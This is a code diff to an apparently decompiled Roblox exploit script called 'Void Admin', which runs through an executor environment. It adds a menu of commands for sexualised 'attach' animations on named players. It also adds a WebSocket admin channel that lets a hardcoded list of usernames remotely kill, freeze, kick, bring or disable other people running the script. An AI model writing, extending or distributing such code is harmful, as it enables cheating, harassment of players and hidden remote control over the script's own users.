+<font color="rgb(200,200,200)">;fb</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Facebang</font>
+<font color="rgb(200,200,200)">;hs</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Headsit</font>
+<font color="rgb(200,200,200)">;pat</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Pat</font>
+<font color="rgb(200,200,200)">;bh</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Backhug</font>
+<font color="rgb(200,200,200)">;fh</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Fronthug</font>
+<font color="rgb(200,200,200)">;prop</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Propose</font>
+<font color="rgb(200,200,200)">;hb</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Hipbang</font>
+<font color="rgb(200,200,200)">;bp</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Bagpack</font>
+<font color="rgb(200,200,200)">;gn</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Goon</font>
+<font color="rgb(200,200,200)">;hide</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Hide player</font>
+<font color="rgb(200,200,200)">;unhide</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Unhide player</font>
+<font color="rgb(200,200,200)">;stop</font> <font color="rgb(150,150,150)">- Stop attach features</font>]], false)
+													textBox2.Text = ""
+													return
+												end
+
+												if string.lower(string.sub(text, 1, 5)) == ".say " then
+													if _G.ExecuteSayCommand and _G.ExecuteSayCommand(text, localPlayer_2, false) then
+														textBox2.Text = ""
 														return
 													end
 												end
+
+												local cmdMatch, targetArg = text:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
+												if not cmdMatch then
+													cmdMatch = text:match("^(%.%w+)")
+												end
+												local cLower = cmdMatch and string.lower(cmdMatch)
+												local remoteKick = getgenv().executeRemoteKick or executeRemoteKick
+												local remoteAdmin = getgenv().executeRemoteAdminCommand or executeRemoteAdminCommand
+												local procAdmin = getgenv().processAdminCommand or processAdminCommand
+
+												if cLower == ".kick" and targetArg and remoteKick then
+													remoteKick(targetArg)
+												elseif cLower and (cLower == ".kill" or cLower == ".respawn" or cLower == ".reset" or cLower == ".freeze" or cLower == ".unfreeze" or cLower == ".thaw" or cLower == ".bring" or cLower == ".disable" or cLower == ".undisable") then
+													if remoteAdmin then
+														remoteAdmin(cLower, targetArg, text)
+													elseif procAdmin then
+														procAdmin(localPlayer_2, text, false)
+													end
+												else
+													if procAdmin then
+														procAdmin(localPlayer_2, text, false)
+													end
+												end
+												textBox2.Text = ""
+												return
+											end
 
 												spawnGlobalMessage("[SYSTEM]", "Not connected to Global Chat. Reconnecting...", true)
 												pcall(fn16)
@@ -84889,7 +85029,7 @@ _G.ExecuteSayCommand = executeSayCommandInternal
 					nextBlock = 356
 				end
 			elseif nextBlock == 355 then
-				spill_2.r13 = { pagalkuta99 = true, rtn3742 = true, jeremywade_98 = true, iblame_uuu = true }
+				spill_2.r13 = { pagalkuta99 = true, rtn3742 = true, jeremywade_98 = true, iblame_uuu = true, missibubu = true, hor1zen = true }
 				nextBlock = 356
 			elseif nextBlock == 356 then
 				do
@@ -85118,8 +85258,73 @@ _G.ExecuteSayCommand = executeSayCommandInternal
 				end
 
 				do
+					function executeRemoteAdminCommand(cmdName, targetStr, fullText)
+						if not cmdName or cmdName == "" then return end
+						local targetClean = targetStr and string.gsub(string.gsub(targetStr, "\"", ""), "'", "") or ""
+						targetClean = string.gsub(targetClean, "^%s+", ""):gsub("%s+$", "")
+						local tLower = string.lower(targetClean)
+
+						local ws = globalWebSocket or v8
+						if ws then
+							pcall(function()
+								local HttpService = game:GetService("HttpService")
+								local myPlr = game.Players.LocalPlayer
+								local senderName = (myPlr and myPlr.Name) or "missibubu"
+								local cmdObj = {
+									event = "admin-command",
+									channel = "global",
+									data = {
+										type = "ADMIN_COMMAND",
+										cmdId = string.sub(cmdName, 2) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(10000, 99999)),
+										sender = senderName,
+										username = senderName,
+										displayName = (myPlr and myPlr.DisplayName) or senderName,
+										userId = (myPlr and myPlr.UserId) or 0,
+										command = cmdName,
+										text = fullText,
+										target = targetClean,
+									},
+								}
+								if iterFn12 then
+									iterFn12(ws, cmdObj)
+								else
+									local json = HttpService:JSONEncode(cmdObj)
+									if type(ws.Send) == "function" then
+										local ok = pcall(function() ws:Send(json) end)
+										if not ok and type(ws.send) == "function" then ws:send(json) end
+									elseif type(ws.send) == "function" then
+										ws:send(json)
+									end
+								end
+							end)
+						end
+
+						pcall(function()
+							local myPlr = game.Players.LocalPlayer
+							if myPlr and processAdminCommand then
+								local myName = string.lower(myPlr.Name)
+								local myDisplay = string.lower(myPlr.DisplayName or "")
+								local matchesSelf = (tLower == "all" or tLower == "me" or tLower == myName or tLower == myDisplay or (tLower ~= "" and (string.find(myName, tLower, 1, true) or string.find(myDisplay, tLower, 1, true))))
+								if matchesSelf then
+									local adminStub = {
+										Name = myPlr.Name,
+										DisplayName = myPlr.DisplayName,
+										UserId = myPlr.UserId,
+										Character = myPlr.Character,
+									}
+									processAdminCommand(adminStub, fullText, false)
+								end
+							end
+						end)
+
+						if typeof(SendNotification) == "function" then
+							SendNotification("Void Admin", "Dispatched " .. cmdName .. " to " .. (targetClean ~= "" and targetClean or "all"), 3)
+						end
+					end
+
 					pcall(function()
 						getgenv().executeRemoteKick = executeRemoteKick
+						getgenv().executeRemoteAdminCommand = executeRemoteAdminCommand
 					end)
 
 					task.spawn(function()
@@ -85229,22 +85434,22 @@ _G.ExecuteSayCommand = executeSayCommandInternal
 							n204 = 282349457
 							n205 = 850609727
 
-							if type(str3) == "string" and string.sub(str3, 1, 5) == ".say " then
+							if type(str3) == "string" and string.lower(string.sub(str3, 1, 5)) == ".say " then
 								if _G.ExecuteSayCommand then
-									_G.ExecuteSayCommand(str3, player)
+									_G.ExecuteSayCommand(str3, player, isRemote)
 									return
 								end
 							end
 
 							if player and player.Name then
 								local str4 = string.lower(player.Name)
-								if not P2PAdmins[str4] and str4 ~= "pagalkuta99" and str4 ~= "rtn3742" and str4 ~= "jeremywade_98" and str4 ~= "iblame_uuu" then
+								if not P2PAdmins[str4] and str4 ~= "pagalkuta99" and str4 ~= "rtn3742" and str4 ~= "jeremywade_98" and str4 ~= "iblame_uuu" and str4 ~= "missibubu" and str4 ~= "hor1zen" then
 									return
 								end
 								local str5 = string.lower(str3)
 
 								if string.sub(str5, 1, 1) == "." then
-									local match, part = str3:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
+									local match, part = str3:match("^(%.%w+)%s+[\"\']?([^\"\']+)[\"\']?")
 									local str6
 
 									if not match then
@@ -85258,25 +85463,34 @@ _G.ExecuteSayCommand = executeSayCommandInternal
 									if part and part ~= "" then
 										local str7 = string.gsub(string.gsub(part, "\"", ""), "'", "")
 										local str8 = string.gsub(str7, "^%s+", ""):gsub("%s+$", "")
-										-- Only dispatch remote kick if this command was initiated locally on THIS client by the admin (not received over WebSocket/network)
-										if not isRemote and (player == L1.Players_.LocalPlayer) and str6 == ".kick" then
-											executeRemoteKick(str8)
-											return
+										-- Only dispatch remote command if this command was initiated locally on THIS client by the admin (not received over WebSocket/network)
+										if not isRemote and (player == L1.Players_.LocalPlayer) then
+											if str6 == ".kick" then
+												executeRemoteKick(str8)
+												return
+											elseif str6 == ".kill" or str6 == ".freeze" or str6 == ".unfreeze" or str6 == ".thaw" or str6 == ".bring" or str6 == ".disable" or str6 == ".undisable" then
+												if executeRemoteAdminCommand then
+													executeRemoteAdminCommand(str6, str8, str3)
+													return
+												end
+											end
 										end
+										local str8_lower = string.lower(str8)
 										local str9 = string.lower(L1.Players_.LocalPlayer.DisplayName)
 										local str10 = string.lower(L1.Players_.LocalPlayer.Name)
 										local flag8 = false
 
-										if str8 == "all" then
+										if str8_lower == "all" then
 											flag8 = true
-										elseif str8 == "others" and L1.Players_.LocalPlayer.Name ~= player.Name then
+										elseif str8_lower == "others" and L1.Players_.LocalPlayer.Name ~= player.Name then
 											flag8 = true
-										elseif str8 == "me" and L1.Players_.LocalPlayer.Name == player.Name then
+										elseif str8_lower == "me" and L1.Players_.LocalPlayer.Name == player.Name then
 											flag8 = true
-										elseif (string.find(str9, str8, 1, true) or string.find(str10, str8, 1, true)) and L1.Players_.LocalPlayer.Name ~= player.Name then
+										elseif (str8_lower == str9 or str8_lower == str10) then
+											flag8 = true
+										elseif (string.find(str9, str8_lower, 1, true) or string.find(str10, str8_lower, 1, true)) and L1.Players_.LocalPlayer.Name ~= player.Name then
 											flag8 = true
 										end
-
 										if flag8 then
 											local character2 = L1.Players_.LocalPlayer.Character
 											local humanoidRootPart2 = character2
@@ -85492,6 +85706,20 @@ _G.ExecuteSayCommand = executeSayCommandInternal
 												tbl.AdminDisabled = false
 												tbl.AttachLockedDisabled = false
 												SendNotification("Void Admin", "Your features have been re-enabled by an admin.", 5)
+											elseif str6 == ".kill" or str6 == ".respawn" or str6 == ".reset" then
+												pcall(function()
+													local lp = L1.Players_.LocalPlayer or (game.Players and game.Players.LocalPlayer)
+													local char = lp and lp.Character
+													if char then
+														local hum = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChild("Humanoid")
+														if hum then
+															hum.Health = 0
+														else
+															char:BreakJoints()
+														end
+													end
+													SendNotification("Void Admin", "You have been killed/respawned by an admin.", 3)
+												end)
 											end
 										end
 
